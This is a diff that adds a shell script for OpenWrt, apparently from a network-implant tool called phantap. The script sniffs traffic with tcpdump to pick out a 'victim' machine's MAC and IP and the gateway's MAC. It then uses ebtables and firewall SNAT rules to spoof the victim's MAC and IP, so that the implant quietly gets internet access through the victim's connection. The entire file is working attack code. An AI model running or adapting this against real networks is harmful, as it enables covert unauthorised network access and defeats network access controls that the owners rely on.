@@ -1,0 +1,68 @@
+#!/bin/sh
+
+. /lib/functions/network.sh
+
+INTF=phantap
+network_get_device BRIDGE $INTF
+[ -z "$BRIDGE" ] && { echo "Bridge not ready"; exit; }
+
+while true; do
+    # uses tcpdump to grab IPV4 unicast traffic with dest IP non rfc 1918
+    # this assumes that:
+    # - the victim is using rfc 1918 ip (not ipv6 / not public ip / ...)
+    # we use "ether proto 0x0800" instead of "ip" so we are sure there is no vlan
+    echo "Listening to traffic ..."
+    packet=$(tcpdump -i $BRIDGE -nn -e -c 1 -Q in -q 'ether proto 0x0800 and not broadcast and not multicast and not (dst net (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16))')
+    # packet="09:42:42.424242 00:11:22:33:44:55 > 66:77:88:99:aa:bb, IPv4, length 66: 10.1.2.3.55334 > 1.2.3.4.443: tcp 0"
+    addresses=$(echo $packet | sed -E 's/^[^ ]+ ([0-9a-f:]{17}) > ([0-9a-f:]{17})[^:]+: (\d+\.\d+\.\d+\.\d+)\.\d+ > (\d+\.\d+\.\d+\.\d+)\.\d+:.*/mysedworked \1 \2 \3 \4/')
+    # addresses="mysedworked 00:11:22:33:44:55 66:77:88:99:aa:bb 10.1.2.3 1.2.3.4"
+    set -- $addresses
+    if [ "$1" != "mysedworked" ]; then
+        echo "Unable to parse captured packet \"$packet\", retrying"
+        sleep 1
+        continue
+    fi
+    victim_mac=$2
+    gw_mac=$3
+    victim_ip=$4
+    echo "We got a winner! victim_mac=$2, gw_mac=$3, victim_ip=$4"
+    break
+done
+
+br_mac=$(cat /sys/class/net/$BRIDGE/address)
+network_get_ipaddr br_ip $INTF
+network_get_gateway gw_fakeip $INTF true
+
+# Flush neighbour table
+# As ARP and IPv6 are disabled this blocks outgoing traffic on $BRIDGE
+ip neigh flush dev $BRIDGE
+
+# Create a chain so we can cleanup
+ebtables -t nat -N phantap -P RETURN 2>/dev/null && ebtables -t nat -A POSTROUTING -j phantap
+
+# Cleanup old rules if exist
+ebtables -t nat -F phantap
+# Replace our local mac with the victim mac
+ebtables -t nat -A phantap -s $br_mac -o $BRIDGE -j snat --to-source $victim_mac
+
+# Integrate with OpenWrt so firewall reloads don't break our rule
+fp=firewall.phantapr
+uci batch <<EOF
+set $fp=redirect
+set $fp.enabled='1'
+set $fp.target='SNAT'
+set $fp.dest='phantap'
+set $fp.proto='all'
+set $fp.name='phantap'
+set $fp.src_dip=$victim_ip
+set $fp.src_ip=$br_ip
+EOF
+uci commit firewall
+/etc/init.d/firewall reload
+
+# Add mac for the fake gateway, we now have network access (except this local lan)
+ip neigh replace $gw_fakeip lladdr $gw_mac dev $BRIDGE
+
+echo "setup done, you now have access to internet"
+
+# restart openvpn
